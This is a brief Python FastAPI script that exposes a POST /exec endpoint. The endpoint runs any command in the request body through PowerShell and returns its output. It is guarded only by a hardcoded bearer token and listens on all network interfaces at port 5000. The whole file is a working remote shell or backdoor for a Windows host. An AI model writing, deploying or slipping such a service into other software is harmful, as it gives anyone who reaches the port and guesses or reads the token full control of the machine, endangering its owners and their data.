from fastapi import FastAPI, Header, HTTPException
import subprocess, uvicorn

app = FastAPI()
TOKEN = "Generation_2026"

@app.post("/exec")
async def run_cmd(data: dict, authorization: str = Header(None)):
    if authorization != f"Bearer {TOKEN}": raise HTTPException(403)
    cmd = data.get("cmd", "")
    res = subprocess.run(["powershell", "-NoProfile", "-Command", cmd], capture_output=True, text=True, encoding='cp866')
    return {"status": "ok", "stdout": res.stdout}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5000)
